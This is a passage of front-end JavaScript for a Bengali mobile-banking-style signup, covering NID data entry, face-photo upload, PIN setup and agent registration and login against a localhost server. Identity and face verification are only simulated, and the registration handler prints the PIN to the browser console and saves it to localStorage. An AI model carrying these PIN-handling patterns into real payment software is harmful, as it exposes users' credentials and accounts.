      });
    }
  }

  // Handle image upload and preview
  function handleImageUpload(event, previewElement) {
    const file = event.target.files[0];
    if (!file) return;

    // Validate file type
    if (!file.type.match("image.*")) {
      showNotification("শুধুমাত্র ছবি আপলোড করুন");
      return;
    }

    // Validate file size (max 5MB)
    if (file.size > 5 * 1024 * 1024) {
      showNotification("ছবির সাইজ 5MB এর কম হতে হবে");
      return;
    }

    const reader = new FileReader();
    reader.onload = (e) => {
      previewElement.innerHTML = `<img src="${e.target.result}" alt="Preview">`;
      previewElement.classList.add("has-image");
    };
    reader.readAsDataURL(file);
  }

  // Simulate NID data extraction via OCR
  function simulateNidDataExtraction() {
    // Show loading notification
    showNotification("NID তথ্য যাচাই করা হচ্ছে...");

    // In a real implementation, this would be an API call to an OCR service
    setTimeout(() => {
      // For demo, we'll use predefined data
      const extractedData = {
        name: "আতাউর রহমান",
        fatherName: "আব্দুল ওয়াদুদ",
        motherName: "আফরোজা বেগম",
        dob: "1993-07-25",
        address:
          "আকন্দ বাড়ী, গ্রাম/রাস্তা: হালুয়া রাজার চষ্টি, মনতলা, ডাকঘর: সৈয়দা এলাকা - ২০০১, জামালপুর সদর, জামালপুর",
        nidNumber: "1993391368",
      };

      // Store in user object
      currentUser.nidInfo = extractedData;

      // Populate form fields
      populateNidFormFields(extractedData);
    }, 1000);
  }

  // Populate NID form fields with extracted data
  function populateNidFormFields(data) {
    const nameField = document.getElementById("nidName");
    const fatherNameField = document.getElementById("nidFatherName");
    const motherNameField = document.getElementById("nidMotherName");
    const dobField = document.getElementById("nidDob");
    const addressField = document.getElementById("nidAddress");
    const nidNumberField = document.getElementById("nidNumber");

    if (nameField) nameField.value = data.name;
    if (fatherNameField) fatherNameField.value = data.fatherName;
    if (motherNameField) motherNameField.value = data.motherName;
    if (dobField) dobField.value = data.dob;
    if (addressField) addressField.value = data.address;
    if (nidNumberField) nidNumberField.value = data.nidNumber;
  }

  // NID details popup handlers
  function setupNidDetailsPopup() {
    const submitBtn = document.getElementById("btnSubmitNidDetails");
    const editBtn = document.getElementById("btnEditNidDetails");

    // Populate form with extracted NID data
    if (currentUser.nidInfo) {
      populateNidFormFields(currentUser.nidInfo);
    }

    if (editBtn) {
      editBtn.addEventListener("click", () => {
        // Enable all form fields for editing
        const formInputs = document.querySelectorAll(
          "#nidDetailsPopup input, #nidDetailsPopup textarea"
        );
        formInputs.forEach((input) => {
          input.readOnly = false;
        });

        showNotification("তথ্য সংশোধন করতে পারেন");
      });
    }

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        // Validate all required fields
        const nameField = document.getElementById("nidName");
        const fatherNameField = document.getElementById("nidFatherName");
        const motherNameField = document.getElementById("nidMotherName");
        const dobField = document.getElementById("nidDob");
        const addressField = document.getElementById("nidAddress");
        const nidNumberField = document.getElementById("nidNumber");

        if (
          !nameField.value ||
          !fatherNameField.value ||
          !motherNameField.value ||
          !dobField.value ||
          !addressField.value ||
          !nidNumberField.value
        ) {
          showNotification("সকল প্রয়োজনীয় তথ্য দিন");
          return;
        }

        // Validate NID number (10 digits only)
        if (nidNumberField.value.length !== 10) {
          showNotification("সঠিক NID নম্বর দিন (১০ ডিজিট)");
          return;
        }

        // Update user object with form data
        currentUser.nidInfo = {
          name: nameField.value,
          fatherName: fatherNameField.value,
          motherName: motherNameField.value,
          dob: dobField.value,
          address: addressField.value,
          nidNumber: nidNumberField.value,
        };

        hidePopup("nidDetailsPopup");
        showPopup("faceVerificationPopup");
      });
    }
  }

  // Face verification popup handlers
  function setupFaceVerificationPopup() {
    const frontFaceInput = document.getElementById("frontFaceInput");
    const leftFaceInput = document.getElementById("leftFaceInput");
    const rightFaceInput = document.getElementById("rightFaceInput");
    const frontPreview = document.getElementById("frontFacePreview");
    const leftPreview = document.getElementById("leftFacePreview");
    const rightPreview = document.getElementById("rightFacePreview");
    const submitBtn = document.getElementById("btnSubmitFaceVerification");

    if (frontFaceInput && frontPreview) {
      frontFaceInput.addEventListener("change", (e) => {
        handleImageUpload(e, frontPreview);
      });
    }

    if (leftFaceInput && leftPreview) {
      leftFaceInput.addEventListener("change", (e) => {
        handleImageUpload(e, leftPreview);
      });
    }

    if (rightFaceInput && rightPreview) {
      rightFaceInput.addEventListener("change", (e) => {
        handleImageUpload(e, rightPreview);
      });
    }

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        if (
          !frontPreview.classList.contains("has-image") ||
          !leftPreview.classList.contains("has-image") ||
          !rightPreview.classList.contains("has-image")
        ) {
          showNotification("সব তিনটি ছবি তুলুন");
          return;
        }

        // Simulate face verification process
        simulateFaceVerification();
      });
    }
  }

  // Simulate face verification with NID
  function simulateFaceVerification() {
    // Show loading notification
    showNotification("ছবি যাচাই করা হচ্ছে...");

    // Simulate server verification delay
    setTimeout(() => {
      // Success verification simulation
      hidePopup("faceVerificationPopup");
      showPopup("pinSetupPopup");
    }, 2000);
  }

  // PIN setup popup handlers - Enhanced with improved validation
  function setupPinSetupPopup() {
    const pinInputs = document.querySelectorAll(".pin-input2");
    const confirmInputs = document.querySelectorAll(".pin-confirm-input");
    const submitBtn = document.getElementById("btnSubmitPin");
    const showPinCheckbox = document.getElementById("showPinCheckbox");

    // Setup automatic focus behavior for PIN inputs
    setupPinInputFields(pinInputs);
    setupPinInputFields(confirmInputs);

    if (showPinCheckbox) {
      showPinCheckbox.addEventListener("change", function () {
        const inputType = this.checked ? "text" : "password";

        pinInputs.forEach((input) => {
          input.type = inputType;
        });

        confirmInputs.forEach((input) => {
          input.type = inputType;
        });
      });
    }

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        // Collect and validate PIN
        let pin = "";
        let confirmPin = "";
        let isPinComplete = true;
        let isConfirmComplete = true;

        pinInputs.forEach((input) => {
          if (!input.value) isPinComplete = false;
          pin += input.value;
        });

        confirmInputs.forEach((input) => {
          if (!input.value) isConfirmComplete = false;
          confirmPin += input.value;
        });

        if (!isPinComplete || !isConfirmComplete) {
          showNotification("সম্পূর্ণ ৫ ডিজিটের পিন দিন");
          return;
        }

        if (pin !== confirmPin) {
          showNotification("পিন মিলছে না");
          // Clear confirm inputs
          confirmInputs.forEach((input) => {
            input.value = "";
          });
          confirmInputs[0].focus();
          return;
        }

        // Validate PIN strength (e.g., not sequential or repeated digits)
        if (isWeakPin(pin)) {
          showNotification("দুর্বল পিন। শক্তিশালী পিন ব্যবহার করুন");
          return;
        }

        // Set the hidden field value
        const pinField = document.getElementById("fullPin2");
        if (pinField) {
          pinField.value = pin;
          console.log("Registration PIN value set to:", pin);
        }

        // Store PIN and complete registration
        currentUser.pin = pin;
        currentUser.isLoggedIn = true;

        // Save to localStorage for session persistence
        saveUserToLocalStorage();

        // Update account display
        updateAccountDisplay();

        // Submit the form or proceed to success screen
        const form = document.getElementById("registerForm");
        if (form) {
          form.submit();
        } else {
          hidePopup("pinSetupPopup");
          showPopup("successPopup");
        }
      });
    }
  }

  // Check if PIN is weak (sequential, repeated, common patterns)
  function isWeakPin(pin) {
    // Check for sequential numbers (e.g., 12345)
    const sequential = "01234567890";
    if (sequential.includes(pin)) return true;

    // Check for reverse sequential (e.g., 54321)
    const reverseSeq = "09876543210";
    if (reverseSeq.includes(pin)) return true;

    // Check for repeated digits (e.g., 11111)
    if (/^(\d)\1{4}$/.test(pin)) return true;

    // Check common PINs
    const commonPins = [
      "12345",
      "54321",
      "11111",
      "22222",
      "33333",
      "44444",
      "55555",
      "66666",
      "77777",
      "88888",
      "99999",
      "00000",
      "98765",
      "56789",
    ];
    if (commonPins.includes(pin)) return true;

    return false;
  }

  // Setup PIN input fields behavior
  function setupPinInputFields(inputs) {
    if (!inputs || !inputs.length) return;

    // Auto focus first input
    inputs[0].focus();

    inputs.forEach((input, index) => {
      // Handle numeric input and auto-advance
      input.addEventListener("input", function (e) {
        // Replace any non-numeric input
        this.value = this.value.replace(/[^0-9]/g, "");

        if (this.value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      // Handle backspace
      input.addEventListener("keydown", function (e) {
        if (e.key === "Backspace") {
          if (!this.value && index > 0) {
            inputs[index - 1].focus();
          }
        }
      });
    });
  }

  // Update account display in success popup
  function updateAccountDisplay() {
    const accountNumber = document.getElementById("accountNumber");
    const nidNumber = document.getElementById("successNidNumber");

    if (accountNumber && currentUser.mobileNumber) {
      accountNumber.textContent = "+880" + currentUser.mobileNumber;
    }

    if (nidNumber && currentUser.nidInfo && currentUser.nidInfo.nidNumber) {
      // Show masked NID number for security
      const nid = currentUser.nidInfo.nidNumber;
      const maskedNid =
        nid.substring(0, 2) + "XXXXXX" + nid.substring(nid.length - 2);
      nidNumber.textContent = maskedNid;
    }
  }

  // Success popup handlers - Fixed for proper services button functionality
  function setupSuccessPopup() {
    const okButton = document.getElementById("btnSuccessOk");

    updateAccountDisplay();

    if (okButton) {
      okButton.addEventListener("click", () => {
        hideAllPopups();

        // Show login popup directly
        showPopup("loginVerificationPopup");

        // Show notification
        showNotification("লগইন করুন");
      });
    }
  }

  // Make important functions globally accessible
  window.showPopup = showPopup;
  window.hideAllPopups = hideAllPopups;
  window.showNotification = showNotification;
});

// Registration form submission event handler
document.addEventListener('DOMContentLoaded', function() {
  if (document.getElementById('registerForm')) {
    document.getElementById('registerForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const form = e.target;

      // Create form PIN from individual inputs
      let fullPins = '';
      form.querySelectorAll('.pin-input2').forEach(input => {
        fullPins += input.value;
      });

      // Set the hidden field value
      document.getElementById("fullPin2").value = fullPins;

      // Debug output
      const formData = new FormData(form);
      for (let [key, value] of formData.entries()) {
        console.log(key, value);
      }

      // try {
      //   const response = await fetch('/register', {
      //     method: 'POST',
      //     body: formData
      //   });

      //   const result = await response.json();
      //   if (result.success) {
      //     alert("Registration Successfully Completed");
      //   } else {
      //     alert('Registration failed: ' + result.message);
      //   }
      // } catch (error) {
      //   console.error('Error:', error);
      //   alert('Something went wrong!');
      // }
    });
  }


  // agent code 

let agentName = document.getElementById("agentName").value ;
let agentAddress = document.getElementById("agentAddress").value ;
let agentDistrict = document.getElementById("agentDistrict").value ;
let agentUpazila = document.getElementById("agentUpazila").value ;
let agentPhone = document.getElementById("agentPhone").value ;
let agentEmail = document.getElementById("agentEmail").value ;
let agentDob = document.getElementById("agentDob").value ;
let pinss = document.querySelectorAll(".confirm-pin") ;

let btnSubmitSetPin = document.getElementById("btnSubmitSetPin");

btnSubmitSetPin.addEventListener("click", function () {

    let agentName = document.getElementById("agentName").value.trim();
    let agentAddress = document.getElementById("agentAddress").value.trim();
    let agentDistrict = document.getElementById("agentDistrict").value;
    let agentUpazila = document.getElementById("agentUpazila").value;
    let agentThanaMarket = document.getElementById("agentThanaMarket").value;
    let agentPhone = document.getElementById("agentPhone").value.trim();
    let agentEmail = document.getElementById("agentEmail").value.trim();
    let agentDob = document.getElementById("agentDob").value;
    let agentAgreed = document.getElementById("agentTermsCheckbox").checked;


    let pinInputs = document.querySelectorAll(".set-pin");
    let fullPin = "";
    pinInputs.forEach(function (item) {
        fullPin += item.value;
    });

    let allDetails = {
        name: agentName,
        address: agentAddress,
        district: agentDistrict,
        upazila: agentUpazila,
        thanaMarket: agentThanaMarket,
        phone: agentPhone,
        email: agentEmail,
        dob: agentDob,
        agreedToCertificate: agentAgreed,
        fullPin: fullPin
    };


    fetch("http://localhost:3000/agent/register", {
      method: "POST",
      headers: {
        "content-type": "application/json"
      },
      body: JSON.stringify({allDetails})
    })
    .then(async function(r1){

    const data = await r1.json();

    if(r1.ok) {
      // console.log("Success:", data.message);  
      alert(data.message) ;
    } else {
      alert(data.message) ;
      // console.error("Error:", data.message);  
    }
  })
  .catch(function(err){
    console.error("Network error:", err);
  });

});

// login agent 

let mobileNum = document.getElementById("agentLoginNumber") ;
let loginBtn = document.getElementById("btnSubmitAgentPin") ;

loginBtn.addEventListener("click" , function(){

  let mobile = mobileNum.value ;
  
  let pins = document.querySelectorAll(".agent-login");
  let fullPins = "";

  pins.forEach(function(item){
    fullPins += item.value;
  });

  // console.log(mobile , fullPins) 

    fetch("http://localhost:3000/agent/login", {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify({
      mobile: mobile ,
      pin: fullPins 
    })
  })
  .then(async function(r1){

  const data = await r1.json();

  if(r1.ok) {
    // console.log("Success:", data.message);  
    alert(data.message) ;
  } else {
    alert(data.message) ;
    // console.error("Error:", data.message);  
  }
})
.catch(function(err){
  console.error("Network error:", err);
});


})


});

// Add ESC key handler to force remove overlays if they get stuck
window.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') {
    document.querySelectorAll('.overlay, .popup').forEach(el => {
      el.classList.remove('show');
    });
    document.body.style.overflow = 'auto';
  }
});



